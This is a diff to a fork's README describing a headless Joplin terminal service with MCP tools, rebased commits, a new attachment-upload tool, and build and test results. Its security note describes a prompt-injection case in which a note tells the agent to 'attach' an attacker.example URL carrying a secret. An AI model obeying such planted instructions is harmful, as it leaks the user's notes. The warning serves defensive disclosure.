@@ -2,21 +2,22 @@
 
 # Headless terminal app (fork notes)
 
-This branch (`headless-service`, cut from upstream `dev` at `64167f5fc`) makes the terminal app (`packages/app-cli`, npm `joplin`) usable as a long-running, headless Data API / MCP service, including semantic search. It is meant to replace running the interactive terminal UI inside tmux.
+This branch (`headless-service`, cut from upstream `dev`, last rebased onto `7ea19e8ab` on 2026-11-24) makes the terminal app (`packages/app-cli`, npm `joplin`) usable as a long-running, headless Data API / MCP service, including semantic search. It is meant to replace running the interactive terminal UI inside tmux.
 
 ## What changed
 
-The work is split into two independent pull requests' worth of commits, plus one commit that connects them. PR 2 applies cleanly to `dev` without PR 1 and type-checks on its own. PR 3 (sync before MCP reads) builds on PR 2.
+The work is split into two independent pull requests' worth of commits, plus one commit that connects them. PR 2 applies cleanly to `dev` without PR 1 and type-checks on its own. PR 3 (sync before MCP reads) builds on PR 2. PR 4 (attachment upload tool) only touches `packages/lib` and uses PR 3's `readsNotes` flag.
 
 | Commit | PR | Summary |
 |---|---|---|
-| `03d0a0de5` | 1 | Cli: Add support for local AI embeddings and semantic search |
-| `ac7383143` | 1 | Cli: Show AI and MCP settings in the config command |
-| `b20972621` | 2 | All: Allow apps without GUI to sync and index changes as they happen (`packages/lib`) |
-| `eaa486a9f` | 2 | Cli: Add a headless service mode to the server command |
-| `cda6b8b02` | 1 + 2 | Cli: Run the embedding indexer in headless service mode |
-| `912e28645` | 3 | All: Allow MCP clients to sync before reading notes (`packages/lib`) |
-| `c01e9f819` | 3 | Cli: Sync before MCP reads in headless service mode |
+| `c01c91e55` | 1 | Cli: Add support for local AI embeddings and semantic search |
+| `992648e7b` | 1 | Cli: Show AI and MCP settings in the config command |
+| `7f5a0428a` | 2 | All: Allow apps without GUI to sync and index changes as they happen (`packages/lib`) |
+| `032a93412` | 2 | Cli: Add a headless service mode to the server command |
+| `7584dd566` | 1 + 2 | Cli: Run the embedding indexer in headless service mode |
+| `220228dd1` | 3 | All: Allow MCP clients to sync before reading notes (`packages/lib`) |
+| `4b5c1aa0f` | 3 | Cli: Sync before MCP reads in headless service mode |
+| `1c8e815bd` | 4 | All: Add an MCP tool to upload attachments (`packages/lib`) |
 
 ### PR 1: local embeddings in the terminal app
 
@@ -70,6 +71,21 @@ Without this, an agent only sees changes made on other devices after the next ti
 - `packages/app-cli`: `HeadlessService.preReadSync()` is the hook (registered in its constructor, removed in `destroy()`). With no sync target it does nothing. Otherwise it calls `requestSync()`, so concurrent reads share one sync and a sync already running is followed by a fresh one. For `search_notes` it then runs `SearchEngine.syncTables()` until the full-text cursor reaches the last note change. For `semantic_search_notes` (once the indexer's initial scan is done) it runs `EmbeddingIndexer.maintenance()` until the embedding cursor reaches the last change. Reads by id don't wait for either index. The whole hook is bounded by 30 s (`preReadSyncTimeout`); after that the read proceeds with a warning and the sync carries on in the background. Sync errors and `mustAuthenticate` are also returned as warnings.
 - Agents should pass `sync: false` for bulk reads (for example, reading many notes in a row) once one call in the batch has synced. The tool's schema description says so.
 
+### PR 4: `upload_resource` MCP tool
+
+Agents could read attachments (`read_image`) but not create them. `upload_resource` (`packages/lib/services/ai/tools/global/uploadResource.ts`) creates an attachment and, optionally, links it from a note.
+
+- Content comes from exactly one of `data_base64` (a data URL is accepted too), `text` (stored as UTF-8) or `url`. `filename` gives the title and the type; it is required except with `url`, where it defaults to the last path segment, with an extension taken from the response's `Content-Type` when the URL has none.
+- `url` downloads are made by the server, so they use `shim.fetchBlob` with `publicNetworkOnly` (loopback, LAN and Tailscale addresses are refused, on redirects too), http(s) only, no retries, a 60 s inactivity timeout and a 100 MB limit.
+- With `note_id`, the link (`![title](:/id)` for images, `[title](:/id)` otherwise, or HTML for HTML notes) is added at the end of the note, or at the start with `position: "prepend"`. The note is checked before anything is created, so a wrong id doesn't leave an orphaned attachment. Without `note_id` the tool returns the same link as `markdown`, for the agent to place with `create_note` or `update_note`. Joplin eventually deletes attachments that no note links to.
+- Images are stored as provided (no resizing).
+- It is a write tool with its own setting, `ai.tool.upload_resource.enabled` (off by default, like the other write tools). It is flagged `readsNotes`, so in service mode it syncs first unless `sync: false`.
+- Returns `{ id, title, mime, size, markdown, note_id? }`.
+
+`data_base64` has to be written out by the model, so it only suits small files (icons, small diagrams). For real images and documents agents should pass a `url`. Clients that can run commands on the same host can also keep using the Data API (`POST /resources`, multipart) and then link the id with `update_note`.
+
+**Security note:** `url` lets whoever controls the agent's input make this host send a GET request to any public address. Together with the read tools, that is a way to leak note content through a prompt injection (for example a note that tells the agent to "attach" `https://attacker.example/?q=<secret>`). Leave the tool disabled for agents that read untrusted content.
+
 ## Building the terminal app from the monorepo
 
 The root `postinstall` builds every workspace, including Electron and mobile. Instead, install only the CLI workspace and its dependencies, then compile its closure of workspace packages in dependency order.
@@ -96,7 +112,7 @@ rm -rf packages/app-cli/node_modules/onnxruntime-node/bin/napi-v6/{win32,darwin,
 - The repo's `.dockerignore` is written for the server image and **excludes `packages/app-cli/`**, so a `COPY . .` Docker build won't work. Clone the fork at a pinned commit inside the build stage instead (see below).
 - No compilers are needed on linux-x64: sqlite3, sharp, keytar and onnxruntime-node use prebuilt binaries. The build does need `rsync`, which the CLI's `gulp build` uses to copy `app/` to `build/`, and `git` if you clone inside the image. `node:22-bookworm-slim` ships neither.
 
-Measured on haven (6-core i5-8500, 16 GB) in `node:22-bookworm-slim` (Node 22.23), from a clean fetch of commit `cda6b8b02`, with no cache:
+Measured on haven (6-core i5-8500, 16 GB) in `node:22-bookworm-slim` (Node 22.23), from a clean fetch of commit `7584dd566`, with no cache:
 
 | Step | Time | Tree size after |
 |---|---|---|
@@ -145,7 +161,7 @@ $J config api.port 41184
 $J config mcp.enabled true
 $J config ai.enabled true                       # ai.embedding.enabled defaults to true
 for t in search_notes read_note read_image list_notebooks list_tags create_note update_note \
-	delete_note manage_tags create_notebook semantic_search_notes; do
+	delete_note manage_tags create_notebook semantic_search_notes upload_resource; do
 	$J config ai.tool.$t.enabled true
 done
 # Sync target, e.g. Joplin Server: sync.target 9, sync.9.path, sync.9.username, sync.9.password
@@ -230,6 +246,15 @@ Unit tests: `packages/app-cli` `yarn test-ci` 28 suites, 131 tests pass. `packag
 
 **Infra live suite** (`~/infra-management/tests/joplin_mcp`, `JOPLIN_MCP_URL=http://127.0.0.1:41190/mcp JOPLIN_MCP_PROFILE=<A>`): 25 passed, 3 skipped (public tests, no `JOPLIN_MCP_PUBLIC_URL`), 3 deselected (`slow`). `test_semantic_search` **passes**: it only marks itself as an expected failure when the tool returns an error, so with this branch it passes outright (reported as PASSED, not XPASS). `read_notes` is present and enabled (it shares `read_note`'s setting), and the notification test passes. Suggested changes to that suite, not made: make `semantic_search` a real test (create a note, then poll with a related query until it is returned), add `read_notes` to `EXPECTED_TOOLS`, assert 202 for notifications, and add `status`/`sync` endpoint tests (`POST /services/headless`).
 
+**Rebase onto `dev` and `upload_resource` (PR 4)**, run on 2026-11-24 with Node 22.23.4, after rebasing the branch onto `7ea19e8ab` (218 upstream commits, no conflicts):
+
+- `packages/app-cli`, `yarn test-ci`: 30 suites, 142 tests, all pass.
+- `packages/lib`, `yarn test-ci` (before PR 4): 207 of 209 suites pass, 2419 tests passed, 3 skipped, 8 failed. The failures are the same two suites as before (`shim-init-node.test`, `utils/tls/setExtraRootCertificates.test`, `Symbol.asyncDispose is not defined` under Node 22; upstream now targets Node 24).
+- `services/mcp/McpServer.test.ts` with the 11 new `upload_resource` tests: 55 pass.
+- ESLint was not run: the focused install (`yarn workspaces focus joplin`) doesn't include the root lint plugins.
+- End to end against `server start --service` on a scratch profile: base64 PNG attached to a note (bytes identical on disk, readable with `read_image`); text file returned as a link and placed with `update_note`; two public image URLs downloaded (13 kB and 225 kB); `http://127.0.0.1…`, a Tailscale address, `file://`, an HTTP 404, two sources and an unknown note id all return tool errors and leave no attachment or temporary file behind.
+- Infra live suite (with its new `upload_resource` tests) against the same instance: 31 passed, 5 skipped, 3 deselected, 1 failed (`test_search_existing_notes`, which needs a synced profile with real notes).
+
 ## Known issues and notes
 
 - **Full-text search lag:** with `sync: false`, `search_notes` sees a change up to about 10 s after it lands locally, because `SearchEngine.scheduleSyncTables()` debounces by 10 s (same as desktop). In the e2e run, MCP-created notes were searchable after about 2 s, and B→A notes after 12–21 s with a 15 s sync interval. With the default `sync: true` (PR 3), the search waits for the index instead.
@@ -245,7 +270,7 @@ Unit tests: `packages/app-cli` `yarn test-ci` 28 suites, 131 tests pass. `packag
 
 ## Before upstreaming
 
-- Open as two PRs, in order: PR 1 (`03d0a0de5`, `ac7383143`), then PR 2 (`b20972621`, `eaa486a9f`) plus the glue commit `cda6b8b02`, which belongs with whichever PR merges second.
+- Open as two PRs, in order: PR 1 (`c01c91e55`, `992648e7b`), then PR 2 (`7f5a0428a`, `032a93412`) plus the glue commit `7584dd566`, which belongs with whichever PR merges second.
 - Upstream may prefer a separate command (e.g. `joplin service`) over `server start --service`, a GET-able status route instead of `services/headless`, or a different name for `isLongRunning()`.
 - Document `--service` and the endpoints in `readme/apps/terminal.md`, and mention the terminal app in `readme/apps/ai_mcp.md` (which says the desktop Web Clipper must be running).
 - PR 1 adds about 260 MB of `onnxruntime-node` binaries (all platforms) to the npm `joplin` package's install size. Upstream may want these as `optionalDependencies`, or to fetch them on demand.
